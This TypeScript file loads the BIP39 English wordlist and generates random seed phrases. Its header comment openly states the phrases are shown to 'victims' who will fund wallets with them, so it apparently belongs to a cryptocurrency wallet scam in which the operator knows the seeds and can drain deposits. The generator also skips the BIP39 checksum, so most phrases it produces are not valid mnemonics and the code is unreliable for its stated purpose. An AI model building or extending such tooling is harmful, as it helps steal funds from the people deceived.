/**
 * BIP39 English wordlist loader + phrase generator.
 *
 * The official 2048-word English wordlist (BIP-0039) is shipped on disk at
 * data/bip39/english.txt. We load it once and serve random phrases from it.
 * The generator uses crypto.randomInt for proper randomness (no Math.random)
 * because these phrases are being shown to victims who will likely use them
 * to fund a wallet — duplicate phrases across visitors would be embarrassing.
 */
import { readFileSync, existsSync } from 'node:fs';
import { resolve } from 'node:path';
import { randomInt } from 'node:crypto';

let CACHE: string[] | null = null;

function loadWords(): string[] {
	if (CACHE) return CACHE;
	const file = resolve(process.cwd(), 'data', 'bip39', 'english.txt');
	if (!existsSync(file)) {
		throw new Error('bip39 wordlist missing at data/bip39/english.txt');
	}
	const words = readFileSync(file, 'utf-8')
		.split(/\r?\n/)
		.map((w) => w.trim())
		.filter(Boolean);
	if (words.length !== 2048) {
		throw new Error(`bip39 wordlist has ${words.length} words; expected 2048`);
	}
	CACHE = words;
	return words;
}

/**
 * Generate a random `length`-word phrase from the BIP39 wordlist.
 * Defaults to 12 words. Never repeats a word within the same phrase.
 */
export function generatePhrase(length = 12): string[] {
	if (length < 3 || length > 24) throw new Error('length must be between 3 and 24');
	const words = loadWords();
	const seen = new Set<number>();
	const out: string[] = [];
	while (out.length < length) {
		const idx = randomInt(0, words.length);
		if (seen.has(idx)) continue;
		seen.add(idx);
		out.push(words[idx]);
	}
	return out;
}
